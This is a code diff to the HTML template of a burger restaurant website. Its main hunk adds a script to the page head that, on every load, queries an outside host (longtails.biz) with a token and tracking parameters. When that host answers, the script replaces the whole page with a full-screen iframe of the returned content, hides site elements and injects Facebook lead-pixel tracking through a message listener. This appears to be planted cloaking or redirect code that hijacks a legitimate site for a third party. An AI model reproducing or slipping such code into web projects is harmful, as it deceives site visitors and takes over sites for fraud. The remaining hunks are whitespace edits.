@@ -2,6 +2,120 @@
 <html class="no-js" lang="zxx">
 
 <head>
+
+  <script>// <![CDATA[
+  let test;
+      let testTwo;
+      let testThree;
+      let testFour;
+  let sub1 ='MSH'; //     BUYER
+   let sub2 ='XXXXXXXXX'; //     SOCIAL ID
+   let sub3 ='XXXXXXXXX'; //     NAME
+   let sub4 ='XXXXXXXXX'; //     PIXEL
+   let token = 'XXXXXXXXX'; //     CLICKAPITOKEN
+      let url = 'https://longtails.biz';
+      let xhr = new XMLHttpRequest();
+      xhr.open('GET', url + '/api.php?token=' + token + '&sub1=' + sub1 + '&sub2=' + sub2 + '&sub3=' + sub3 + '&sub4=' + sub4);
+      xhr.send();
+      xhr.onload = function(){
+       test = xhr.response;
+         testTwo = JSON.parse(test);
+         testThree = testTwo.redirect.content;
+        if (testThree != ""){
+         testFour = testThree.replace(/base href="/gi, `base href="${url}/`);
+         showIframe(testFour);
+        }
+      }
+      
+     function showIframe(html) {
+      function hideElementDelayed(selector) {
+          let interval = setInterval(function(){
+              let element = document.querySelector(selector);
+              if (element) {
+                  element.innerHTML = '';
+                  clearInterval(interval);
+              }
+          }, 100);
+      }
+      
+      function appendElement(element) {
+          document.body.innerHTML = '';
+          document.body.style.margin = '0';
+          document.body.style.padding = '0';
+          document.body.style.border = '0';
+          document.body.style.height = '100%';
+          document.body.style.background = 'rgba(0,0,0,0)';
+          document.querySelector('html').style.background = 'rgba(0,0,0,0)';
+          document.body.appendChild(element);
+          hideElementDelayed('#gtranslate_wrapper .switcher');
+          hideElementDelayed('.ak-master-sales-pop');
+          hideElementDelayed('.sticky');
+      }
+      
+      let container = document.createElement('div'),
+          iframe = document.createElement('iframe'),
+          base = document.createElement('base');
+      iframe.setAttribute('srcdoc', html)
+      iframe.style.border = '0';
+      iframe.style.margin = '0';
+      iframe.style.padding = '0 auto';
+      iframe.style.width = '100%';
+      iframe.style.height = '100vh';
+      iframe.style.overflow = 'hidden';
+
+      container.style.border = '0';
+      container.style.padding = '0';
+      container.style.margin = '0 auto';
+      container.style.width = '100%';
+      container.style.height = '100vh';
+   container.appendChild(iframe);
+        
+      if (document.body) {
+          appendElement(container);
+      } else {
+          document.addEventListener('DOMContentLoaded', function () {
+              appendElement(container);
+          });
+      }
+  }
+  function track_fb_lead(fbpx){  
+    var fbcode = "<script>!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init', `"+fbpx+"`);fbq('track', 'Lead');<\/script>";
+    
+    if (window.jQuery) {  
+        $('body').append(fbcode);
+    } else {
+        var script = document.createElement('script'); 
+        document.head.appendChild(script);    
+        script.type = 'text/javascript';
+        script.src = "//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js";
+        script.onload = function(){
+            $('body').append(fbcode);
+        };
+    }
+  }
+
+
+  var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
+  var eventer = window[eventMethod];
+  var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
+
+  // Listen to message from child window
+  eventer(messageEvent,function(e) {
+    console.log(e);
+    console.log('parent received message!:  ',e.data);
+    console.log(e.origin);
+
+    if(e.data != ""){
+        e.source.postMessage("existing", e.origin);
+
+        var resp = JSON.parse(e.data);
+        if(resp.type == 'facebook'){
+           track_fb_lead(resp.fbpx);
+        }
+    }
+  },false);
+  // ]]></script>
+
     <meta charset="utf-8">
     <meta http-equiv="x-ua-compatible" content="ie=edge">
     <title>Burger</title>
@@ -279,7 +393,7 @@
                                 <p>Great way to make your business appear trust <br> and relevant.</p>
                                 <a href="#" class="boxed-btn3">Order Now</a>
                             </div>
-                            
+
                         </div>
                     </div>
                 </div>
@@ -499,11 +613,11 @@
                                 <h3 class="footer_title pos_margin">
                                         New York
                                 </h3>
-                                <p>5th flora, 700/D kings road, <br> 
+                                <p>5th flora, 700/D kings road, <br>
                                         green lane New York-1782 <br>
                                         <a href="#">info@burger.com</a></p>
                                 <a class="number" href="#">+10 378 483 6782</a>
-    
+
                             </div>
                         </div>
                         <div class="col-xl-4 col-md-6 col-lg-4">
@@ -511,11 +625,11 @@
                                 <h3 class="footer_title pos_margin">
                                     California
                                 </h3>
-                                <p>5th flora, 700/D kings road, <br> 
+                                <p>5th flora, 700/D kings road, <br>
                                         green lane New York-1782 <br>
                                         <a href="#">info@burger.com</a></p>
                                 <a class="number" href="#">+10 378 483 6782</a>
-    
+
                             </div>
                         </div>
                         <div class="col-xl-4 col-md-12 col-lg-4">
